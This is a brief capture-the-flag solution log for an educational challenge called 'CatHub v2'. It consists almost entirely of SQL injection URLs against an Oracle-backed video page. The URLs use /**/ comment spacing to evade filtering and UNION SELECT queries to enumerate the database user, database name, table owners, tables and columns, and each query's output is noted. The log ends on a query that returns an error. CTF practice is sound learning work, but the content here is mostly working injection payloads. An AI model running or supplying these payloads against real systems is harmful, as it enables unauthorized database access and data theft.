# CatHub v2 solution step by step
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/1,user,null/**/from/**/dual/**/where/**/rownum/**/=/**/1` --> SCOTT
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/1,SYS.DATABASE_NAME,null/**/from/**/dual` --> XE
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/DISTINCT/**/1,OWNER,null/**/from/**/ALL_TABLES` --> XDB (DB_NAME_META)
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/DISTINCT/**/1,OWNER,null/**/from/**/ALL_TABLES/**/where/**/rownum=1` --> SYS (DB_NAME)
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,TABLE_NAME,null/**/from/**/ALL_TABLES` --> AUDIT_ACTIONS (TABLE_NAME_META)
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,TABLE_NAME,null/**/from/**/ALL_TABLES/**/where/**/rownum=1` --> DUAL (TABLE_NAME)
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,COLUMN_NAME,null/**/from/**/ALL_TAB_COLUMNS` --> ABORT_STEP (COLUMN_NAME_META)
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,COLUMN_NAME,null/**/from/**/ALL_TAB_COLUMNS/**/where/**/rownum=1` --> DUMMY (COLUMN)   
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,DUMMY,null/**/from/**/dual` --> ERROR   